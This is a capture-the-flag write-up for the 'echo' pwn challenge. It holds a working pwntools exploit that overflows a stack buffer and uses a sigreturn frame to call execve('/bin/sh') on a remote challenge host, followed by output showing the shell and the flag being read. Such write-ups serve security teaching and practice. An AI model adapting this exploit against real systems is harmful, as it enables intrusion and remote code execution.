## echo

```
486

tell me something to say it back

EU instance: 161.97.176.150 9090

US instance: 185.172.165.118 9090

author: M_alpha
```

Tags: _pwn_ _x86-64_ _srop_ _bof_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./echo')

syscall = next(binary.search(asm('syscall')))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(binary.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload  = b''
payload += 0x188 * b'A'
payload += p64(binary.sym.echo)
payload += p64(syscall)
payload += bytes(frame)

if args.REMOTE:
	p = remote('185.172.165.118', 9090)
else:
	p = process(binary.path)

p.sendline(payload)
p.recvline()
p.sendline((constants.SYS_rt_sigreturn - 1) * b'A')
p.recvline()
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/0x41414141ctf2021/echo/echo'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 185.172.165.118 on port 9090: Done
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000 groups=1000
$ cat flag.txt
flag{a2e14ad30c012978fc870c1f529e8156}
```

